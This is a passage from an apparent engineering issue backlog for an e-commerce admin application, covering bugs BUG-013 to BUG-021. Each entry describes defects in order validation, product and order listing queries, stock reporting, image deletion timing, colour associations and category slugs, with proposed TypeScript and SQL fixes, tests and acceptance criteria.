       const hasSettled = payments.some(p => p.status === "paid");
       const isCod = …order.paymentMethod.type === "cod";
       if (!hasSettled && !isCod) {
         throw new ValidationError(
           "Order cannot be confirmed without a verified payment. " +
           "Approve the payment first, or record the order as Cash on Delivery."
         );
       }
     }
   }
   ```
   COD orders (`status === 'pending'` at creation) are legitimately confirmable without a payment row — the cash is collected on delivery. Preserve that.
2. Call it immediately after the FSM check and before `commitOrderSale`.
3. Align the client-side table: `src/views/OrderDetail.tsx` must not offer `confirmed` unless the `order.paymentStatus` is `approved` or the method is COD. Keep the client table **derived** from a shared constant rather than a copy (see ARCH-005).
4. Add a history note when a manual confirmation happens with a paid payment (as opposed to a COD confirmation).
5. Do not weaken `pending → confirmed` for COD.

**Expected Behavior After Fix:**
A prepaid order cannot be confirmed without a `paid` payment; the UI does not offer the action. COD orders confirm exactly as before. The attempt produces an actionable message, not a silent stock commit.

**Dependencies:**
- **Depends on** BUG-006, BUG-009.
- **Related** ARCH-005 (shared FSM), BUG-013 (coupon/stock on confirm).

**Testing Requirements:**
- Failure: `awaiting_payment` + no payment → `confirmed` rejected.
- Failure: `payment_submitted` + `awaiting_verification` → rejected.
- Normal: `payment_submitted` + `paid` → `confirmed`, stock committed.
- Normal: COD `pending` + no payment → `confirmed`, stock committed.
- UI: the "Confirmed" control is hidden/disabled for invalid preconditions.

**Acceptance Criteria:**
- [ ] Precondition check exists and runs before stock commitment.
- [ ] COD path preserved.
- [ ] UI reflects the same rule.
- [ ] Clear error message.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-013 — Engraving validation ignores `max_characters` and option type

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/server/validation/orders.ts
src/db/schema/engraving.ts
```

**Problem Description:**
`createOrder` validates that the engraving option exists and is active, snapshots its price, and stores the text. It never checks the option's `max_characters` limit, and never checks that the supplied payload matches the option `type` (`name` requires `text`, `logo` requires `logoUrl`). The Zod schema enforces only "text or logoUrl present" and `text` max 100.

**Current Implementation:**
`src/server/services/order.service.ts:208-236`:
```ts
const [engOpt] = await tx.select().from(engravingOptions)
  .where(eq(engravingOptions.id, itemInput.engraving.engravingOptionId)).limit(1);
if (!engOpt || !engOpt.isActive) throw new ValidationError("Selected engraving option is invalid or inactive.");
const engPriceNum = Number(engOpt.price);
engravingTotal += engPriceNum * itemInput.quantity;
itemEngravings.push({ engravingOptionId: engOpt.id, text: …, logoUrl: …, placement: … });
```
`maxCharacters` is selected nowhere; `engOpt.type` is never read. `src/server/validation/orders.ts` `orderItemEngravingInputSchema` allows `text` up to 100 chars regardless of the option, and accepts both fields populated.

**Root Cause:**
Validation was split between the generic Zod schema (structural) and the service (referential), and the per-option business constraints fell into the gap.

**Real-World Failure Scenario:**
An engraving option configured with `max_characters = 12` (fits the left chest) receives a 40-character name. The order is accepted and paid; the production team discovers it cannot be stitched to spec, and the order must be cancelled and refunded — burning a coupon redemption and a stock reservation. Or a `logo`-type option receives only `text`, producing an order item engraving that has no artwork.

**Required Implementation:**

1. In the engraving validation block, after loading `engOpt`:
   ```ts
   const payload = itemInput.engraving;
   if (engOpt.type === "name") {
     if (!payload.text?.trim()) throw new ValidationError(
       `Engraving option '${engOpt.name}' requires engraved text.`);
     const max = engOpt.maxCharacters ?? 20;
     if (payload.text.trim().length > max) throw new ValidationError(
       `Engraving text for '${engOpt.name}' exceeds the ${max}-character limit.`);
   }
   if (engOpt.type === "logo") {
     if (!payload.logoUrl?.trim()) throw new ValidationError(
       `Engraving option '${engOpt.name}' requires a logo file.`);
     if (payload.logoImagekitFileId && !/^[a-zA-Z0-9_-]+$/.test(payload.logoImagekitFileId)) {
       throw new ValidationError("Invalid engraving logo reference.");
     }
   }
   ```
2. Tighten `orderItemEngravingInputSchema`: keep the "text or logo" refine for structural validity, and let the service enforce per-option rules (it has the row).
3. Validate `logoUrl` against the ImageKit endpoint (same helper as SEC-014) rather than accepting any string.
4. Add the resolved `maxCharacters` to the order item snapshot metadata? **No** — snapshots must remain minimal; instead record a history/order note only on rejection.
5. Surface the limit in the UI: `ProductForm`/order-creation UI should read the option's `maxCharacters` and enforce it client-side as UX (server remains authoritative). If no order-creation UI exists in this repo (`createOrderAction` has no view caller — verified), document that the constraint is enforced for API and future storefront callers only.

**Expected Behavior After Fix:**
Over-length text and type-mismatched payloads are rejected before any reservation, with messages naming the option and the limit. Valid payloads behave exactly as today.

**Dependencies:**
- **Related** BUG-002 (same validation block), SEC-007/SEC-014 (logo URL trust).

**Testing Requirements:**
- Failure: 13 chars on a 12-char option → `VALIDATION_ERROR`.
- Failure: `type=name` with only `logoUrl` → rejected.
- Failure: `type=logo` with only `text` → rejected.
- Normal: boundary (exactly `max`) → accepted.
- Normal: `maxCharacters = null` → default limit applied (document the default).
- Edge: non-ImageKit `logoUrl` → rejected.

**Acceptance Criteria:**
- [ ] `maxCharacters` enforced.
- [ ] Option `type` enforced.
- [ ] Logo URL validated.
- [ ] Boundary length accepted.
- [ ] Default documented when the column is null.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-014 — `ProductRepository.findPaginated` ignores `inStock` and `sortBy: "price"`

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/product.repository.ts
src/server/validation/catalog.ts
```

**Problem Description:**
`productFilterSchema` accepts `inStock` and `sortBy: "price"`. The repository never applies `inStock`, and its sort switch has no `price` case — it falls through to `createdAt`. Both filters silently do nothing.

**Current Implementation:**
`src/server/validation/catalog.ts:160-170`: `inStock: z.coerce.boolean().optional()`, `sortBy: z.enum(["name","createdAt","updatedAt","price","status"]).default("createdAt")`.
`src/server/repositories/product.repository.ts:118-150` builds `conditions` for status/deletedAt/categoryId/gender/isFeatured/q — no `inStock`.
`src/server/repositories/product.repository.ts:164-181`:
```ts
switch (filter.sortBy) {
  case "name": orderByClause = [sortDir(products.name)]; break;
  case "status": orderByClause = [sortDir(products.status)]; break;
  case "updatedAt": orderByClause = [sortDir(products.updatedAt)]; break;
  case "createdAt":
  default: orderByClause = [sortDir(products.createdAt)]; break;   // ← "price" lands here
}
```
Aggregation later computes `minPrice` per product via a separate query, so a price sort would need that value at sort time.

**Root Cause:**
The schema advertised capabilities that the query never implemented. Because `sortBy` has a `default`, an unsupported value fails silently rather than erroring.

**Real-World Failure Scenario:**
An admin filtering "in stock only" sees out-of-stock products mixed in and concludes the catalog is broken; a merchandiser sorting by price ascending gets a created-date ordering and communicates wrong pricing priorities to the storefront team. No error is surfaced anywhere.

**Required Implementation:**

1. **`inStock`** means `EXISTS (inventory row with quantity_on_hand - quantity_reserved > 0)` for the product's variants. Implement as:
   ```ts
   if (filter.inStock === true) {
     conditions.push(sql`EXISTS (
       SELECT 1 FROM inventory i
       JOIN product_variants pv ON pv.id = i.variant_id
       WHERE pv.product_id = ${products.id}
         AND (i.quantity_on_hand - i.quantity_reserved) > 0
     )`);
   } else if (filter.inStock === false) {
     conditions.push(sql`NOT EXISTS ( … same subquery … )`);
   }
   ```
   Note `z.coerce.boolean()` turns the *string* `"false"` into `true` — a real defect. Replace with `z.enum(["true","false"]).transform(v => v === "true").optional()` or `z.union([z.boolean(), z.literal("true"), z.literal("false")]).transform(...)`. Apply the same fix to `isFeatured`.
2. **`sortBy: "price"`** must sort by the product's minimum variant price. Compute it in the same statement to avoid a second round trip:
   ```sql
   LEFT JOIN LATERAL (
     SELECT MIN(pv.price) AS min_price FROM product_variants pv WHERE pv.product_id = products.id
   ) price_agg ON TRUE
   ```
   and `ORDER BY price_agg.min_price ASC/DESC NULLS LAST`. Drizzle: `.leftJoinLateral(sql`(SELECT MIN(price) AS min_price FROM product_variants WHERE product_id = ${products.id})`, …)` or use a correlated subquery in `orderBy`. Keep the existing pagination/`offset` semantics.
3. Keep the shape of `ProductListItem` unchanged (it already carries `minPrice`).
4. Add an index to support the new sort (§8): `product_variants(product_id, price)` — DB-006.

**Expected Behavior After Fix:**
`inStock=true` returns only products with sellable stock; `inStock=false` returns only products without. `sortBy=price` orders by min variant price, ascending or descending as requested, with nulls last. `"false"`/`"true"` query strings parse correctly.

**Dependencies:**
- **Related** DB-006 (index), PERF-003 (the listing's query count).

**Testing Requirements:**
- Fixture: product A (all variants 0 available), product B (one variant 3 available), product C (no inventory rows).
- `inStock=true` → only B. `inStock=false` → A and C.
- `sortBy=price&sortOrder=asc` → ascending by min price.
- `sortOrder=desc` → descending, nulls last.
- `?inStock=false` (string) → interpreted as false.
- Pagination remains correct with the lateral join.

**Acceptance Criteria:**
- [ ] `inStock` applied for both true and false.
- [ ] `price` sorting implemented.
- [ ] Boolean coercion fixed for `inStock` and `isFeatured`.
- [ ] Count and page totals agree.
- [ ] Index added per DB-006.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-015 — Product list computes stock as `quantityOnHand`, ignoring reservations

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/product.repository.ts
src/server/services/product.service.ts
src/lib/dto.ts
```

**Problem Description:**
The product listing aggregates `inventory.quantityOnHand` as the product's `totalStock` and exposes it to the UI. Available stock (`on_hand - reserved`) is the number that matters, and the inventory module computes it correctly (`inventory.repository.ts:259`). The products list therefore over-reports availability by the reserved amount.

**Current Implementation:**
`src/server/repositories/product.repository.ts:218-226` selects `stock: inventory.quantityOnHand`; a later aggregation sums it into `totalStock`. `src/lib/dto.ts:145` maps `stock: serializeNumber(item.totalStock)` onto a synthetic variant, and `Products.tsx` renders that number. `inventory.repository.ts:259` by contrast computes `const available = onHand - reserved`.

**Root Cause:**
The products aggregate predates the dual-counter ledger (ADR 018) and was never updated when reservations were introduced.

**Real-World Failure Scenario:**
Twenty units are reserved across open orders. The products list shows 25 in stock; the inventory page shows 5 available. Staff trust the products page, promise stock to a wholesale buyer, and oversell.

**Required Implementation:**

1. Change the aggregate to `SUM(GREATEST(quantity_on_hand - quantity_reserved, 0))` and expose it as `availableStock`. Keep `quantityOnHand` as a separate field for the detail view if needed.
2. Update `ProductListItem` typing and `toProductListItemDTO` to map the available figure to `stock` (the view model's field name stays, so no UI churn), and rename the internal field for clarity.
3. Label the column in `src/views/Products.tsx` as "Available" if it currently says "Stock" — a wording change is permitted here because the issue requires it (Safety Rule 3).
4. Do not change `ProductDetailBundle`'s per-variant stock semantics in this issue (the edit form needs on-hand to compute adjustments) — but ensure the detail view shows both.

**Expected Behavior After Fix:**
The products list shows sellable stock, matching the inventory page for the same variant.

**Dependencies:**
- **Related** BUG-014 (same query), PERF-003.

**Testing Requirements:**
- Fixture: on_hand 25, reserved 20 → list shows 5; inventory page shows 5.
- Fixture: on_hand 3, reserved 5 (should be impossible by CHECK, but assert `GREATEST` clamps to 0).
- Regression: product detail still shows on-hand for adjustments.

**Acceptance Criteria:**
- [ ] List aggregates available, not on-hand.
- [ ] Inventory page and products page agree.
- [ ] Column labelled accurately.
- [ ] Detail view retains on-hand.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-016 — `OrderRepository.findPaginated` ignores `paymentStatus`, uses a correlated subquery, and returns orders with zero items

**Priority:** P1
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/order.repository.ts
src/server/validation/orders.ts
src/lib/dto.ts
src/views/Orders.tsx
```

**Problem Description:**
Three defects.

(a) `orderFilterSchema` accepts `paymentStatus`, but `findPaginated` never adds a condition for it — the UI filter silently does nothing.

(b) `latestPaymentStatus` is a correlated subquery evaluated per row:
```sql
(select status from payments where order_id = orders.id order by created_at desc limit 1)
```
Combined with the `orderItems` join and `GROUP BY`, this runs per result row and cannot use an index well.

(c) The DTO maps `items` from `"items" in order`, which is false for `OrderListItem` — so every order in the list gets `items: []`. `src/views/Orders.tsx:87` filters by `order.items.some(i => i.productName…)` (never matches) and line 383 renders `order.items.reduce((s,i)=>s+i.quantity,0)` → **always 0**. The list shows "0 items" for every order even though `itemsCount` was computed and returned.

**Current Implementation:**
`src/server/repositories/order.repository.ts:104-235`; the payment filter block is absent; the subquery is at line 191-193; `itemsCount` is at 192 and selected into `OrderListItem` (`itemsCount: r.itemsCount`). `src/lib/dto.ts:245-268` maps items only when present, else `[]`. `src/views/Orders.tsx:87,383` use `order.items`.

**Root Cause:**
The list and detail shapes share one DTO (`toOrderDTO`) with a runtime `"items" in order` narrowing. That narrowing is unsound across the union, and the fallback (`[]`) silently produces wrong numbers rather than a type error. The payment filter and the correlated subquery were left over from an earlier implementation.

**Real-World Failure Scenario:**
Staff filter "awaiting verification" and see all orders. Every row claims 0 items, so a 12-piece order looks empty and the warehouse cannot plan a pick. On large tables the correlated subquery plus group-by makes the list page slow (see PERF-003).

**Required Implementation:**

1. **Implement the filter.** A payment status filter must consider the order's *effective* payment status:
   ```ts
   if (filter.paymentStatus) {
     conditions.push(sql`EXISTS (
       SELECT 1 FROM payments p
       WHERE p.order_id = ${orders.id} AND p.status = ${filter.paymentStatus}
     )`);
   }
   ```
   Document the semantics: "orders having at least one payment in the given status". If the intended semantics is "latest payment status", use `NOT EXISTS (SELECT 1 FROM payments p2 WHERE p2.order_id = orders.id AND p2.created_at > p.created_at)` — pick one and write it down in the issue's test.
2. **Replace the correlated subquery** with a `LEFT JOIN LATERAL` (one evaluation per order, index-friendly):
   ```sql
   LEFT JOIN LATERAL (
     SELECT status FROM payments WHERE order_id = orders.id ORDER BY created_at DESC LIMIT 1
   ) latest ON TRUE
   ```
   Keep `itemsCount` as `SUM(order_items.quantity)` but compute it in its own lateral aggregate to avoid multiplying rows:
   ```sql
   LEFT JOIN LATERAL (SELECT COALESCE(SUM(quantity),0) AS items_count FROM order_items WHERE order_id = orders.id) ic ON TRUE
   ```
   Then drop the `GROUP BY` and the `orderItems` join entirely — this removes the row-multiplication hazard and is the single biggest win in the list query.
3. **Fix the DTO.** Split `toOrderDTO` into:
   - `toOrderListItemDTO(item: OrderListItem): Order` — sets `items: []` **and** a new `itemsCount` field, and `Orders.tsx` renders `order.itemsCount`.
   - `toOrderDTO(bundle: OrderDetailBundle): Order` — unchanged.
   Add `itemsCount: number` to the `Order` type (optional, defaulting to the sum of item quantities for detail payloads) so both paths type-check.
4. Update `src/views/Orders.tsx`: use `order.itemsCount` for the count and remove the `order.items.some(...)` text-search path (or keep it but note list rows carry no product names — searching by product name requires a server filter; see PERF-005).
5. Add the covering index for the lateral (DB-006): `payments(order_id, created_at DESC)`.

**Expected Behavior After Fix:**
The payment-status filter works. Each list row shows the real item count. Product-name search in the list is either removed (with the note) or backed by a server filter. The list query no longer group-bys.

**Dependencies:**
- **Related** PERF-003, PERF-005, DB-006, BUG-029 (DTO fidelity).

**Testing Requirements:**
- Fixture: order with 3 line items of qty 2,3,4 → list shows 9.
- Fixture: two payments, one `paid` and one `rejected` → filter `paid` and `rejected` both return the order (documented semantics).
- Fixture: order with no payments → only returned when no payment filter is applied.
- Plan check: `EXPLAIN` shows no correlated subplan per row.
- Regression: sorting by total/status/orderNumber works; pagination totals unchanged.

**Acceptance Criteria:**
- [ ] `paymentStatus` filter implemented with documented semantics.
- [ ] Lateral joins replace the correlated subquery and the `orderItems` group-by.
- [ ] List rows expose a correct `itemsCount`.
- [ ] `Orders.tsx` shows real counts.
- [ ] Index added.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-017 — Image deletion fires before the form is saved (data loss)

**Priority:** P0
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/components/shared/image-upload.tsx
src/views/ProductForm.tsx
```

**Problem Description:**
Both the uploader component and the product form delete the ImageKit asset immediately when the admin removes an image from the form, before (and regardless of) whether the product is saved. Abandoning the form, hitting back, or a validation error leaves `product_images` rows pointing at deleted files.

**Current Implementation:**
`src/components/shared/image-upload.tsx:311-324`:
```ts
const handleRemoveMedia = async (media: UploadedMedia) => {
  if (disabled) return;
  if (onRemove) onRemove(media);              // parent state update
  if (media.fileId) {
    try { await deleteMediaAction(media.fileId); }   // ← immediate, irreversible
    catch (err) { console.warn(…); }
  }
};
```
`src/views/ProductForm.tsx:386-398` (`removeImage`) does the same:
```ts
if (target?.fileId) {
  deleteMediaAction(target.fileId).catch((err) => console.warn(…));
}
```
Neither waits for `updateProductAction`/`createProductAction` to succeed. The server-side reconciliation in `product.service.ts:543-597` *also* purges `removedImages` after commit, so removing an image on a saved form deletes the file **twice** (second call fails harmlessly) — evidence that the client-side delete is redundant.

**Root Cause:**
The uploader was designed as a self-contained component that owns the lifecycle of what it uploads. Once the parent form became the owner of persisted state, the delete call was never moved.

**Real-World Failure Scenario:**
An admin opens a product, removes a bad photo, then notices a price typo and navigates away to fix it later. The photo is gone from ImageKit but still in `product_images` — the product shows a broken image on the storefront forever, and the original file cannot be recovered. If the admin removes several images and then hits a validation error on save, all of them are lost.

**Required Implementation:**

1. Delete the ImageKit call from `image-upload.tsx` `handleRemoveMedia`; it must only call `onRemove` so parent state updates (no side effect).
2. Delete the ImageKit call from `ProductForm.tsx` `removeImage`; same reason.
3. Persisted deletion happens **only** in `product.service.updateProduct` after a successful transaction (already implemented at lines 543-597) and in `detachProductImageAction` (SEC-009).
4. For images uploaded during the current editing session but never persisted: track them in component state as `pendingUploads` (already exists) and on unmount/abandon **do not** delete — they become orphans handled by the reaper (ECOM-008 / SEC-009 step 3). Never delete on unmount: an unmount can happen from a re-render.
5. Show the admin an explicit confirmation when removing an image from a **saved** product: "This image will be permanently deleted when you save." Text only; no new modal required if the existing confirmation pattern applies.

**Expected Behavior After Fix:**
Removing an image from an unsaved form leaves the asset untouched. Saving persists the removal and purges the file once, after commit. Abandoning the form changes nothing.

**Dependencies:**
- **Depends on** SEC-009 (action removal must happen together).
- **Related** BUG-021 (image reconciliation), ECOM-008 (orphans).

**Testing Requirements:**
- Remove an image, navigate away → `product_images` unchanged, ImageKit object exists.
- Remove an image, save → row deleted, one purge call, file gone.
- Remove an image, trigger a validation error → nothing deleted.
- Add and remove a brand-new upload before saving → row never created; file orphaned (documented).
- Regression: upload → save → image appears.

**Acceptance Criteria:**
- [ ] No `deleteMediaAction` call from any client component.
- [ ] Purge only after successful commit.
- [ ] Abandoning a form is side-effect free.
- [ ] Admin sees a warning about permanent deletion on save.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-018 — `ProductForm` drops image colour associations on save

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/ProductForm.tsx
src/server/validation/catalog.ts
src/server/services/product.service.ts
src/lib/dto.ts
```

**Problem Description:**
The form lets an admin assign each image to a colour (`image.colorId`), and the DTO surfaces it (`toProductBundleDTO` maps `colorId`). But the save payload omits `colorId` entirely, so every save writes `product_images.color_id = NULL`, wiping existing colour associations. The service *does* support the field (`product.service.ts:562-582` resolves and writes `resolvedImgColorId`), so only the client is wrong.

**Current Implementation:**
`src/views/ProductForm.tsx:485-491` and `:535-541` (both update and create branches):
```ts
images: images.map((img, idx) => ({
  imagekitFileId: img.fileId || `img-${idx}-${Date.now().toString(36)}`,
  url: img.url,
  altText: img.alt || values.name,
  sortOrder: idx,
})),          // ← no colorId
```
Meanwhile `src/views/ProductForm.tsx:989-991` renders the colour badge from `image.colorId`, proving the state exists. `productImageInputSchema` has `colorId: uuidSchema.nullable().optional()`. `product.service.ts:560-566` resolves `img.colorId` through `colorKeyToDbId`.

**Root Cause:**
The image field was added to the schema and the service before the form payload was updated; TypeScript does not complain because `colorId` is optional.

**Real-World Failure Scenario:**
A product has teal and navy photos, each assigned to its colour so the storefront can swap the gallery when a colour is selected. An admin edits the description and saves. All images become colour-agnostic. The storefront shows teal scrubs when the customer selects navy — a direct conversion loss, discovered only after a customer complaint.

**Required Implementation:**

1. Include `colorId` in both payloads:
   ```ts
   images: images.map((img, idx) => ({
     id: img.id && !img.id.startsWith("img-") ? img.id : undefined,
     imagekitFileId: img.fileId ?? /* see BUG-021 */ undefined,
     url: img.url,
     thumbnailUrl: img.thumbnailUrl ?? null,
     altText: img.alt || values.name,
     colorId: img.colorId ?? null,
     sortOrder: idx,
   })),
   ```
2. Map the local colour key to the value the service expects. The service resolves through `colorKeyToDbId` keyed by name/slug and falls back to the raw string; sending the **colour name** is the most reliable input because new colours have no DB id yet. Send `colorName` in addition (the schema supports it) and let the service resolve:
   `colorId: img.colorId ? (colors.find(c => c.id === img.colorId)?.id) : null` **plus** `colorName: colors.find(c => c.id === img.colorId)?.name`.
3. Because a newly created colour has no UUID at payload time, `colorId` must be `null` and `colorName` must carry the association; verify `product.service.ts` uses `colorName` (it does not today — it only reads `img.colorId`). Add `colorName` resolution in the service mirroring the variant path (`variant.colorName` is used at line 196).
4. Keep `sortOrder` stable when reordering (the array index is acceptable given drag-reorder is not implemented — verify; if reorder exists, use the array order as it renders).
5. Remove the `id: img.id` omission: persisted images must be sent with their `id` so the service updates rather than deletes-and-recreates (see BUG-021).

**Expected Behavior After Fix:**
Saving a product preserves and updates per-image colour associations. Newly added colours can be associated before they have database IDs. The storefront can filter the gallery by colour.

**Dependencies:**
- **Depends on** BUG-021 (the same payload block; must be one change).
- **Related** BUG-019 (colour round-trip on variants).

**Testing Requirements:**
- Edit a product with two colour-tagged images, change the description, save → `product_images.color_id` unchanged for both.
- Reassign an image from teal to navy, save → `color_id` updated.
- Add a brand-new colour + image in one save → image linked to the new colour.
- Clear the colour, save → `color_id` NULL.
- Regression: image order preserved.

**Acceptance Criteria:**
- [ ] `colorId` and `colorName` sent for every image.
- [ ] Service resolves new colours by name.
- [ ] Existing associations survive an unrelated save.
- [ ] Reassignment and clearing work.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-019 — Variant colour association lost when colours are renamed or newly created

**Priority:** P1
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/ProductForm.tsx
src/server/services/product.service.ts
```

**Problem Description:**
Variants carry `colorId` and `colorName`. The payload sends only `colorName` (`ProductForm.tsx:487-497` and `:535-546` map `colorName: v.colorName` and never send `colorId`). The service prefers `variant.colorId` and falls back to `colorKeyToDbId` lookups by string (`product.service.ts:417-425`), whose keys are built from the *existing* colours. A newly added colour is not in that map, so the resolved UUID falls back to the raw string (`variant.colorId.toLowerCase().trim()`), which is not a UUID — the insert then writes a non-UUID into a `uuid` column and fails, or (if it is `null`) the variant loses its colour entirely.

Additionally, renaming a colour updates `variants[].colorName` locally (`ProductForm.tsx:221-225` handles `updateColor`) but the resolved DB colour id may still be keyed to the old name, so the rename path relies entirely on `colorId` being present — which it is not.

**Current Implementation:**
`src/views/ProductForm.tsx:487-497`:
```ts
variants: variants.map((v) => ({
  name: v.name, sku: v.sku, size: v.size, price: v.price,
  compareAtPrice: v.compareAtPrice ?? null, stock: v.stock, reorderLevel: v.reorderLevel,
  isActive: v.active, colorName: v.colorName,
})),
```
`src/server/services/product.service.ts:417-425`:
```ts
let resolvedColorId: string | null = null;
if (variant.colorId) {
  resolvedColorId = colorKeyToDbId.get(variant.colorId)
    || colorKeyToDbId.get(variant.colorId.toLowerCase().trim())
    || variant.colorId;         // ← may be a non-UUID local key
}
```
`colorKeyToDbId` is populated from `existing.colors` — a brand-new colour added in the same form is not present.

**Root Cause:**
The service was written for an API client that sends real UUIDs; the form sends a client-side key (`col-teal` from `COLOR_LIBRARY`, or `uid("col")` for new colours). The two contracts were never reconciled, and the fallback masks the mismatch with a value that cannot be stored.

**Real-World Failure Scenario:**
An admin creates a product, adds a new colour "Dusty Rose", creates a variant in it, and saves. The variant insert sends `colorId = "col-m3k9x"` → PostgreSQL `22P02 invalid input syntax for type uuid` → the generic `INTERNAL_SERVER_ERROR`. The product cannot be created at all until the admin removes the colour, which defeats the feature.

**Required Implementation:**

1. In `product.service.ts` (create and update paths), replace the fallback with name-based resolution:
   ```ts
   function resolveColorId(localId: string | null | undefined, localName: string | null | undefined,
                          colorKeyToDbId: Map<string,string>, nameToDbId: Map<string,string>) {
     if (!localId && !localName) return null;
     const byId = localId ? (colorKeyToDbId.get(localId) ?? colorKeyToDbId.get(localId.toLowerCase().trim())) : undefined;
     if (byId) return byId;
     const byName = localName ? nameToDbId.get(localName.toLowerCase().trim()) : undefined;
     if (byName) return byName;
     if (localId && /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(localId)) return localId;
     return null;   // never write a non-UUID
   }
   ```
   Build `nameToDbId` from `existing.colors` plus the colours inserted in this transaction. Process `input.colors` **first** and record their generated ids so variants and images created in the same payload can reference them.
2. In `ProductForm.tsx`, send both values: `colorId: colors.find(c => c.id === v.colorId)?.id ?? null` and `colorName: v.colorName`. Because new colours have no id, `colorName` carries the binding — which requires step 1.
3. Apply the same resolution to the image path (BUG-018).
4. Reject a payload where a variant references a colour that is neither in `input.colors` nor in `existing.colors` — with a clear `ValidationError`, not a DB error.

**Expected Behavior After Fix:**
Creating a product with a brand-new colour and variants in that colour works. Renaming a colour keeps variants attached. No non-UUID value can reach a `uuid` column.

**Dependencies:**
- **Depends on** BUG-018 (shared payload commit).
- **Related** BUG-020 (slug overwrite is the same form).

**Testing Requirements:**
- Create product + new colour + 2 variants → success, `product_variants.color_id` equals the new colour's UUID.
- Rename a colour, save → variants still linked.
- Variant referencing an unknown colour → `VALIDATION_ERROR`.
- Existing product edit without colour changes → `color_id` unchanged.
- Regression: multi-colour matrix creation from the "generate matrix" control still works.

**Acceptance Criteria:**
- [ ] Name-based fallback implemented.
- [ ] New colours resolvable in the same transaction.
- [ ] Non-UUID values can never be written.
- [ ] Rename preserves associations.
- [ ] Clear error for unknown colours.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-020 — Categories UI overwrites custom slugs on every save

**Priority:** P2
**Category:** Bug
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/Categories.tsx
src/server/services/category.service.ts
```

**Problem Description:**
`handleSave` always computes `generatedSlug = slugify(category.name) || category.slug` and sends it, discarding any hand-edited slug. Slugs are public-facing identifiers used by the storefront; silently rewriting them breaks inbound links and SEO.

**Current Implementation:**
`src/views/Categories.tsx:148-190`:
```ts
const handleSave = async (category: Category) => {
  const isExisting = categories.some((c) => c.id === category.id);
  const generatedSlug = slugify(category.name) || category.slug;
  if (isExisting) {
    await updateCategoryAction({ id: category.id, name: category.name, slug: generatedSlug, … });
  } else {
    await createCategoryAction({ name: category.name, slug: generatedSlug, … });
  }
};
```
The edit dialog shows the slug field (`:334`), so the admin *can* edit it — and the edit is discarded on save. `category.service.ts:135-138,166-170` validates uniqueness, which is correct, but it never sees the user's value.

**Root Cause:**
Slug auto-generation was implemented for the create case and applied unconditionally to the update case.

**Real-World Failure Scenario:**
A category is published at `/lab-coats`. Marketing renames it "Lab Coats & Jackets" for clarity. On save the slug becomes `lab-coats-jackets`; every existing storefront URL 404s and search rankings reset. The admin cannot prevent it through the UI.

**Required Implementation:**

1. Only auto-generate a slug when it is empty:
   ```ts
   const slug = (category.slug?.trim() ? category.slug : slugify(category.name)).slice(0, 80);
   ```
2. On **create**, keep auto-generation from the name if the field is untouched (track "dirty" state — a `slugTouched` boolean set by the input's `onChange`).
3. On **update**, never regenerate unless the admin explicitly clicks a "Regenerate" affordance (add a small button next to the field if one does not exist; if adding UI is undesirable, simply honour the field).
4. Validate with the existing `slugSchema` client-side so the user sees the error before submitting.
5. **Do not add redirects** in this issue; record a follow-up if slug history matters (ECOM-012 covers content operations).

**Expected Behavior After Fix:**
Editing a category name leaves the slug untouched unless the admin edits the slug field. New categories get a sensible slug automatically.

**Dependencies:** None. **Related** BUG-019 (same form pattern).

**Testing Requirements:**
- Edit name only → slug unchanged.
- Edit slug explicitly → persisted.
- Create with empty slug → generated from name.
- Create with explicit slug → honoured.
- Duplicate slug → `CONFLICT` from the service (unchanged).

**Acceptance Criteria:**
- [ ] Existing slugs survive a name-only edit.
- [ ] Explicit slugs honoured on create and update.
- [ ] Empty slug auto-generated.
- [ ] Uniqueness still enforced server-side.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-021 — Product form fabricates `imagekitFileId` for URL-only images

**Priority:** P1
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/ProductForm.tsx
src/server/validation/catalog.ts
src/server/services/product.service.ts
src/lib/dto.ts
```

**Problem Description:**
When an image is added by URL (the uploader's `handleAddManualUrl`, `image-upload.tsx:287-306`) there is no `fileId`. The form substitutes a fabricated identifier:
```ts
imagekitFileId: img.fileId || `img-${idx}-${Date.now().toString(36)}`
```
That string is stored in `product_images.imagekit_file_id` and later passed to `imagekit.deleteFile()` on removal, which fails and is swallowed. The column becomes a mix of real ImageKit IDs and junk, so nothing can reliably determine which assets are managed versus external.

**Current Implementation:**
`src/views/ProductForm.tsx:489` and `:539`: `imagekitFileId: img.fileId || \`img-${idx}-${Date.now().toString(36)}\``.
